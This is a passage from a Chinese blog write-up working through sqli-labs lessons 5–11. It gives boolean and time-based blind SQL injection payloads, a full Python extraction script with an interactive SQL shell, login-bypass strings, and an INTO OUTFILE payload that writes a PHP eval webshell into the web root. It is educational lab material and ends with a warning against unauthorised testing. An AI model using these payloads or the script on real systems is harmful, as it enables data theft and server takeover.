<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201123172834958.png" alt="less5-1"></p>
<p>本来可以使用 sqlmap 直接跑出来，但是为了学习还是应该自己一步一步做。</p>
<p>由于没有显示位所以不需要进行显示位的确定。</p>
<h4 id="bool盲注解释"><a href="#bool盲注解释" class="headerlink" title="bool盲注解释"></a>bool盲注解释</h4><p>前面提到，bool 盲注就是前端只会根据不同的条件显示两种状态，像极了bool变量只有true/false两种状态。</p>
<ol>
<li>刚好可以通过合适构造条件表达式，<strong>通过显示与否来确定所构建的表达式的真假。(1)</strong></li>
<li>而mysql数据库有一系列函数，<strong>用于取某个字符 ASCII 值的函数 <code>ascii()</code>  。（2）</strong></li>
<li>同时还有类似于python切片操作的函数，<strong>可以对一个字符串进行切割的函数 <code>mid()</code> 。（3）</strong></li>
<li>我们需要查找的<strong>所有信息都可以通过适当的方法转化为字符串。（4）</strong></li>
</ol>
<p>假设我们要求的仅仅是一个字符 <code>X</code> , 则我们可以结合上述的（1）和（2）.通过 <code>ascii()</code>  函数获取 <code>X</code> 的 ASCII 值，然后通过不停构造大于小于的条件表达式，通过回显的真假慢慢得到目标字符 <code>X</code> 的 ASCII 值，从而得到字符 <code>X</code> 。并且此方法具有良好的二分性，可以通过二分查找的方式实现加速。</p>
<p>假设我们要求的字符串为 <code>S</code> 。则我们可以通过函数 <code>mid()</code> 对目标字符串 <code>S</code> 进行分割，逐一分解成一个一个的字符 <code>X</code> ，再利用上一个求解方法，就可以逐一对目标字符串 <code>S</code> 的每一位进行求解，从而得到字符串 <code>S</code> 。</p>
<p>所以我们要求的所有信息都可以先利用语句转化为字符串 <code>S</code> ，再结合上面的求解方法对目标进行求解。</p>
<h4 id="确定数据库名"><a href="#确定数据库名" class="headerlink" title="确定数据库名"></a>确定数据库名</h4><p>mysql数据库中使用 <code>database()</code> 函数，可以得到目标数据库的名字，其类型也是一个字符串。因此可以利用上述的方法得到。</p>
<p>这里首先 <code>id = 1</code> 的表达式是恒为真的，通过 <code>and</code> 逻辑进行拼接，则后面的表达式为真则整体为真，为假则整体为假，反之亦然。因此，可以通过这个方式判断后续有效表达式的真假。</p>
<p>构建的最初 payload 如下，结果返回为 true。也就是数据库名第一个字母 ASCII 值大于10。<strong>因此可使用二分法放大区间左端点。</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and ascii(mid(database(), 1, 1)) &gt; 10 --+</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201123175132640.png" alt="less5-2"></p>
<p>放大左端点，继续测试。返回结果是 false。也就是数据库名第一个字母 ASCII 值小于120。<strong>因此可使用二分法缩小区间右端点。</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and ascii(mid(database(), 1, 1)) &gt; 120 --+</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201123175419630.png" alt="less5-3"></p>
<p>缩小右端点，继续测试。返回结果为true。也就是数据库名第一个字母 ASCII 值大于113。<strong>因此可使用二分法放大区间左端点。</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and ascii(mid(database(), 1, 1)) &gt; 113 --+</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201123175601114.png" alt="less5-4"></p>
<p>放大左端点，继续测试。返回结果是 false。也就是数据库名第一个字母 ASCII 值小于115。<strong>因此可使用二分法缩小区间右端点。</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and ascii(mid(database(), 1, 1)) &lt; 115 --+</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201123175726393.png" alt="less5-5"></p>
<p>放大左端点，继续测试。返回结果是 true。也就是数据库名第一个字母 ASCII 值大于114。<strong>因此可使用二分法放大区间左端点。</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and ascii(mid(database(), 1, 1)) &gt; 114 --+</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201123180003919.png" alt="less5-6"></p>
<p>到这里就OK了，ASCII 值大于114同时不小于115的值就是115。查阅一下可以知道，ASCII为115的字符是 <code>s</code>。</p>
<p><strong>于是成功得到了第一个字符是 <code>s</code> 。</strong></p>
<p><strong>同理可以得到后续的所有字符，也可以得到其他任意的字符串包括表名和列名，表中的数据。</strong></p>
<h4 id="自动脚本"><a href="#自动脚本" class="headerlink" title="自动脚本"></a>自动脚本</h4><p>闲来无事，就顺手将上述的实现方法使用 python 实现了一遍。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendTo</span>(<span class="params">url</span>):</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># print(f&quot;正在请求url=&#123;url&#125;&quot;)</span></span><br><span class="line">	res = requests.get(url)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检测返回网页是否是True还是False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">res</span>):</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="string">&quot;You are in...........&quot;</span> <span class="keyword">in</span> (res.text)):</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取目标的字段的长度</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getLength</span>(<span class="params">host</span>):</span></span><br><span class="line">	</span><br><span class="line">	length = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		url = host + <span class="string">f&quot;<span class="subst">&#123;length&#125;</span> --+&quot;</span></span><br><span class="line">		res = sendTo(url)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> check(res) == <span class="literal">False</span>:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">		length += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> length</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取一个ascii对应的字符</span></span><br><span class="line"><span class="comment"># 此处的url是只包含了&gt;前面(含&gt;)的部分，为了可以复用</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getAChar</span>(<span class="params">url0</span>):</span></span><br><span class="line">	l = <span class="number">0</span></span><br><span class="line">	r = <span class="number">255</span></span><br><span class="line">	<span class="keyword">while</span> l &lt;= r:</span><br><span class="line">		mid = (l + r) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">		url = url0 + <span class="built_in">str</span>(mid) + <span class="string">&#x27; --+&#x27;</span></span><br><span class="line">		res = sendTo(url)</span><br><span class="line"></span><br><span class="line">		<span class="comment"># True 说明值比原来小</span></span><br><span class="line">		<span class="keyword">if</span> check(res):</span><br><span class="line">			l = mid +<span class="number">1</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			r = mid - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">chr</span>(r)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据库的名字</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getDatabaseName</span>(<span class="params">host</span>):</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment"># 查询数据库名字的长度</span></span><br><span class="line">	url = host + <span class="string">&quot;?id=1&#x27; and length(database()) &gt; &quot;</span></span><br><span class="line">	databaseLen = getLength(url)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 查询数据库名字</span></span><br><span class="line">	databaseName = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, databaseLen + <span class="number">1</span>):</span><br><span class="line">		url = host + <span class="string">f&quot;?id=1&#x27; and ascii(mid(database(),<span class="subst">&#123;i&#125;</span>,1)) &gt;= &quot;</span></span><br><span class="line">		databaseName += getAChar(url)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> databaseName</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过字段长度和sql拼接语句 查询group_concat后的具体内容</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getContent</span>(<span class="params">host, length, sql</span>):</span></span><br><span class="line">	</span><br><span class="line">	name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">		url = host + <span class="string">f&quot;?id=1&#x27; and ascii(mid(<span class="subst">&#123;sql&#125;</span>, <span class="subst">&#123;i&#125;</span>, 1)) &gt;= &quot;</span></span><br><span class="line">		name += getAChar(url)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询有哪些表</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getTables</span>(<span class="params">host, database</span>):</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># database = getDatabaseName(host)</span></span><br><span class="line">	<span class="comment"># database = &#x27;security&#x27;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># 定义一个查询group_concat的表的子查询语句</span></span><br><span class="line">	sqlSelectTable = <span class="string">f&#x27;(select group_concat(table_name) from information_schema.tables where table_schema=\&quot;<span class="subst">&#123;database&#125;</span>\&quot;)&#x27;</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment"># 获取group_concat的字符长度</span></span><br><span class="line">	url = host + <span class="string">f&quot;?id=1&#x27; and length(<span class="subst">&#123;sqlSelectTable&#125;</span>) &gt; &quot;</span></span><br><span class="line">	groupTableLength = getLength(url)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 获取group_concat后的字段具体内容</span></span><br><span class="line">	group_concat_table_name = getContent(host, groupTableLength, sqlSelectTable)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 转化为列表</span></span><br><span class="line">	tables = group_concat_table_name.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> tables</span><br><span class="line">	</span><br><span class="line"><span class="comment"># 获取所有的列 利用字典的方式来存储 键为table，值为columns的列表</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getColumns</span>(<span class="params">host, tables, database</span>):</span></span><br><span class="line">	</span><br><span class="line">	columns = &#123;&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 遍历每个table</span></span><br><span class="line">	<span class="keyword">for</span> table <span class="keyword">in</span> tables:</span><br><span class="line">		<span class="comment"># 定义一个子查询 获取当前table表 下面的group_concat了的列的子查询语句</span></span><br><span class="line">		sqlSelectColumn = <span class="string">f&#x27;(select group_concat(column_name) from information_schema.columns where table_schema=\&quot;<span class="subst">&#123;database&#125;</span>\&quot; and table_name=\&quot;<span class="subst">&#123;table&#125;</span>\&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line">		<span class="comment"># 获取group_cancat了的列的长度</span></span><br><span class="line">		url = host + <span class="string">f&quot;?id=1&#x27; and length(<span class="subst">&#123;sqlSelectColumn&#125;</span>) &gt; &quot;</span></span><br><span class="line">		groupColumnLength = getLength(url)</span><br><span class="line"></span><br><span class="line">		<span class="comment"># 获取group_concat后的字段的具体内容</span></span><br><span class="line">		group_concat_column_name = getContent(host, groupColumnLength, sqlSelectColumn)</span><br><span class="line"></span><br><span class="line">		<span class="comment"># 转化为列表</span></span><br><span class="line">		column = group_concat_column_name.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">		print(<span class="string">f&quot;<span class="subst">&#123;table&#125;</span>: &quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">		print(column)</span><br><span class="line"></span><br><span class="line">		<span class="comment"># 构建字典</span></span><br><span class="line">		columns[table] = column</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> columns</span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试构建一个shell</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql_shell</span>(<span class="params">host, sql</span>):</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment"># 获取查询的内容的长度</span></span><br><span class="line">	url = host + <span class="string">f&quot;?id=1&#x27; and length((<span class="subst">&#123;sql&#125;</span>)) &gt; &quot;</span></span><br><span class="line">	contentLength = getLength(url)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 获取返回的内容</span></span><br><span class="line">	content = getContent(host, contentLength, sql)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"><span class="comment"># 程序主函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"></span><br><span class="line">	HOST = <span class="string">&quot;http://192.168.68.124/sqli-labs/Less-5/&quot;</span></span><br><span class="line"></span><br><span class="line">	database = getDatabaseName(HOST)</span><br><span class="line">	print(<span class="string">&quot;\ndatabase name: &quot;</span> + database)</span><br><span class="line">	</span><br><span class="line">	tables = getTables(HOST, database)</span><br><span class="line">	print(<span class="string">&quot;\ntables: &quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	print(tables)</span><br><span class="line">	print(<span class="string">&quot;\n\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">	print(<span class="string">&quot;columns: &quot;</span>)</span><br><span class="line">	columns = getColumns(HOST, tables, database)</span><br><span class="line">	print(<span class="string">&quot;\ndatabase structure: &quot;</span>)</span><br><span class="line">	print(<span class="string">f&quot;<span class="subst">&#123;database&#125;</span>: &quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	print(columns)</span><br><span class="line"></span><br><span class="line">	print()</span><br><span class="line">	print(<span class="string">&quot;下面是一个简单shell，输入 &#x27;q&#x27; 或者 &#x27;exit&#x27; 退出.&quot;</span>)</span><br><span class="line">	print(<span class="string">&quot;之所以是简单的是因为只写了 &#x27;select ***&#x27; 也就是查询一列的，其他的放弃了，也不能 &#x27;select * &#x27;\n&quot;</span>)</span><br><span class="line">	print(<span class="string">&quot;=&quot;</span>*<span class="number">10</span> + <span class="string">&quot;sql-shell&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		sql = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;$&gt; &quot;</span>))</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> sql == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> sql == <span class="string">&#x27;\n&#x27;</span> <span class="keyword">or</span> sql == <span class="literal">None</span>:</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> sql == <span class="string">&#x27;q&#x27;</span> <span class="keyword">or</span> sql == <span class="string">&#x27;exit&#x27;</span>:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;;&#x27;</span> <span class="keyword">in</span> sql:</span><br><span class="line">			sql = sql.replace(<span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">		sql = <span class="string">&#x27;(&#x27;</span> + sql[:<span class="number">7</span>] + <span class="string">f&quot;group_concat(<span class="subst">&#123;sql[<span class="number">7</span>:sql.index(<span class="string">&#x27; from&#x27;</span>)]&#125;</span>)&quot;</span> + sql[sql.index(<span class="string">&#x27; from&#x27;</span>):] + <span class="string">&#x27;)&#x27;</span></span><br><span class="line"></span><br><span class="line">		content = sql_shell(HOST, sql)</span><br><span class="line">		print(content.split(<span class="string">&#x27;,&#x27;</span>))</span><br><span class="line">		print()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201123184715071.png" alt="less5-7"></p>
<h3 id="less-6"><a href="#less-6" class="headerlink" title="less 6"></a>less 6</h3><p>测试一下会发现这一关的闭合符为 <code>&quot;</code> ，因此方法同前一个，只是将闭合符号转化一下即可。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201123185049767.png" alt="less6-1"></p>
<h3 id="less-7"><a href="#less-7" class="headerlink" title="less 7"></a>less 7</h3><p>这一关略有点恶心，测试闭合符 <code>&#39;</code> 发现语法报错，但是注释了后续还是会报错。在多次测试后，确定闭合符号为 <code>&#39;))</code> 。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;)) --+</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201123185645463.png" alt="less7-1"></p>
<p>按照我的性格就也是一个bool盲注就可以搞定了，使用上面一样的方法，<strong>只是本次 true 的标识是 “You are in…. Use outfile……” 而 false 的标识是报错。</strong>但是这个不怎么友好。有可能也是报错但不是 false。 </p>
<h4 id="导出文件"><a href="#导出文件" class="headerlink" title="导出文件"></a>导出文件</h4><p>查了一下，根据打印的信息 <code> Use outfile......</code> 应该是可以得到是需要导出什么文件的。</p>
<h5 id="判断是否有权限"><a href="#判断是否有权限" class="headerlink" title="判断是否有权限"></a>判断是否有权限</h5><p>由前面的分析可知，本次没有保存则说明条件为 true。 所以通过下面的 payload 如果没有报错，则说明表达式是真，也就是具有 <code>root</code> 权限。实际确实具有权限，无报错。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;)) and (select count(*) from mysql.user)&gt;0 --+</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201123190556672.png" alt="less7-2"></p>
<h5 id="确定列数与显示位"><a href="#确定列数与显示位" class="headerlink" title="确定列数与显示位"></a>确定列数与显示位</h5><p>通过使用下面的 payload 再结合前面的真值，可以确定数据库就是3列。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 无报错</span><br><span class="line">?id&#x3D;1&#39;)) order by 3--+</span><br><span class="line"></span><br><span class="line"># 有报错</span><br><span class="line">?id&#x3D;1&#39;)) order by 4--+</span><br></pre></td></tr></table></figure>
<p>通过下面的 payload，可以确定确实无显示位。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;)) union select 1,2,3 --+</span><br></pre></td></tr></table></figure>


<h5 id="数据导出"><a href="#数据导出" class="headerlink" title="数据导出"></a>数据导出</h5><p>这里据说是要用绝对路径保存文件 同样的道理也可以将其他数据写入。但是我尚且不懂写入了能干啥，还不是拿不到。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39;)) union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()) into outfile &quot;&#x2F;tables.txt&quot; --+</span><br></pre></td></tr></table></figure>
<p><strong>并且这种方法我没有测试成功。</strong></p>
<h5 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h5><p>导出数据不成功，还有另一种方法是生成一个一句话木马，然后使用其他工具，诸如 <code>中国菜刀</code> ， <code>御剑</code> 等工具进行连接。<del><strong>不过，如何得知当前的准确绝对路径我尚且蒙在鼓里。</strong></del></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39;)) union select 1,2,&#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39; into outfile &quot;D:\\PHPWAMP_IN3\\wwwroot\\sqli-labs-master\\Less-7\\shell.php&quot;--+</span><br></pre></td></tr></table></figure>


<h3 id="less-8"><a href="#less-8" class="headerlink" title="less 8"></a>less 8</h3><p>这一关测试一下，会发现是一个通过 <code>&#39;</code> 进行闭合的 bool 盲注，使用前面的脚本跑一下就好了。</p>
<h3 id="less-9"><a href="#less-9" class="headerlink" title="less 9"></a>less 9</h3><p>这一关又是新一关，这关无论对错都只有一个回显，但是在真值表达式中插入 sleep 时（<code>?id=1&#39; and sleep(3) --+</code>）会出现延迟。<strong>因此可以通过时间实现盲注，也即是时间盲注</strong>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and sleep(3) --+</span><br></pre></td></tr></table></figure>
<p>因此可以通过下面的 payload 在上面的自动脚本上进行修改，实现自动时间盲注。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># i 即是需要求解的字符串中第几个需要求解的字符， 115 就是需要猜测的 ascii 的值</span><br><span class="line">&quot;?id&#x3D;1&#39; and if(ascii((mid((select binary group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;) ,i,1))&gt;115),sleep(2),1) --+&quot; </span><br></pre></td></tr></table></figure>
<p>在 python 中，可以通过下面的方式实现超时的判断，从而实现对目标条件是否满足的判断，从而实现相应的脚本。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.get(url+payload, timeout=<span class="number">1</span>) <span class="comment"># 设置超时 1S</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">	<span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>PS：</p>
<p>在mysql的语法中，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IF(expr1,expr2,expr3)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>如果 expr1 是TRUE (expr1 &lt;&gt; 0 and expr1 &lt;&gt; NULL)，则 IF()的返回值为expr2; 否则返回值则为 expr3。IF() 的返回值为数字值或字符串值，具体情况视其所在语境而定。</p>
</blockquote>
<h3 id="less-10"><a href="#less-10" class="headerlink" title="less 10"></a>less 10</h3><p>这题和前面一题一样，只是闭合符换为了 <code>&quot;</code> 。其他的都可以用上一题的方法来进行求解。</p>
<h3 id="less-11"><a href="#less-11" class="headerlink" title="less 11"></a>less 11</h3><p>这一题直接长得都和前面不一样了。可以看间有了一个登录框了，虽然长得丑陋了点，但是又不是不能用。<strong>所以这是个 post 型的注入，前面都是get型的。</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201123195621837.png" alt="less11-1"></p>
<p>二话不说，结合前面的经验，我们先整一个闭合符的上去测试一下。对后端程序的语句多半也是同时判断了用户名和觅马是否一致，因此，我们大可以尝试一下，直接输入用户名，然后将后面的语句注释掉，从而越过 <code>password</code> 的检测。<strong>也就是所谓的万能觅马。</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin&#39; #</span><br><span class="line">password: 123 # 随便乱输</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201123200041537.png" alt="less11-2"></p>
<p>事实上，为了保险点万一 <code>admin</code> 用户没有就不行了，因此可以整一个真正的万能觅马。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: 1&#39; or 1&#x3D;1 #</span><br><span class="line">password: 123 # 随便乱输</span><br></pre></td></tr></table></figure>




<h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>本次实验将XSS攻击和SQL注入攻击进行了一个简单的整理和学习。可以发现这些漏洞都来源于与用户的数据交互中没有对用户的数据合理性进行严格的审查。虽然这些方法都是很入门的简单的，但是基本原理是一致的，通过学习可以掌握这些基本的攻击原理，才能变化出更多的能实际应用的方法。</p>
<p><strong>因此，用户都是坏蛋的。用户的数据都是不可信的。所以数据和用户相关一定要严格进行审查。</strong></p>
<p><strong>最后，请勿在未授权的情况下，进行任何的尝试。</strong></p>
<p><strong>谨以此，备忘。</strong></p>
